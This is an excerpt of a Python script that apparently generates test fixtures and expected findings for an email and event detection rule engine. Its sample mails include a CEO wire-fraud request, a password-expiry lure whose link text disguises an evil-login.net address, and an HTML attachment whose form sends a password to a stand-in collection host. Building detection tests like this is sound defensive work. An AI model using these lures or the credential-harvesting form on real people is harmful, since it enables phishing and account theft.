...
SETTINGS: dict[str, Any] = {
    "internal_domains": ["contoso.com", "interne.fr"], "expected_countries": ["FR"], "vip_names": ["lefevre marie", "alice martin"],
    "admin_accounts": ["administrator", "adm-*"], "service_accounts": ["svc_backup"], "internal_ips": ["10.0.0.0/8", "192.168.0.0/16"],
    "brands": ["contoso"], "trusted_senders": [], "businessHours": {"start": 8, "end": 19, "tz": "Europe/Paris"}, "weekendDays": [0, 6],
}
...
def mails() -> list[dict[str, Any]]:
    ...
    rows.append(message("Payment update", "Please handle this urgent wire transfer today and keep it confidential; I am in a meeting. Thanks, Marie Lefevre", reply_to="Marie Lefevre <marie.lefevre.ceo@gmail.com>"))
    lure = [("From", "IT Support <it-support@contoso-secure.com>"), ("To", "Alice <alice@contoso.com>"), ("Subject", "Password expires today"),
            ("Date", "Tue, 1 Sep 2026 09:05:00 +0000"), ("Message-ID", "<lure-1@contoso-secure.com>"),
    ...
    rows.append(build_row(lure, "Your password expires today. Verify your account now: https://login-contoso.evil-login.net/session", '<html><body><a href="https://login-contoso.evil-login.net/session">https://contoso.com/portal</a></body></html>', [], ctx))
    rows.append(build_row(lure[:2] + [("Subject", "Invoice attached")] + lure[3:], "See attached.", None, [RawAttachment("invoice.html", b'<html><body><form action="https://collect.evil-login.net/x"><input type="password" name="pw"></form></body></html>')], ctx))
...
def main() -> None:
    ...
    (OUT / "expected.json").write_text(json.dumps({"settings": SETTINGS, "rules": sorted(r["id"] for r in bundled), "errors": res["errors"],
                                                   "findings": expected, "diagnostics": {d["ruleId"]: d["reason"] for d in res["diagnostics"]}}, indent=1, sort_keys=True), encoding="utf-8")
    fired = len(expected)
    print(f"{len(ev_rows)} events, {len(ml_rows)} mails, {len(bundled)} bundled rules: {fired} fired, {sum(len(v) for v in expected.values())} findings, {len(res['errors'])} error(s)")
    for e in res["errors"]:
        print("  error", e)
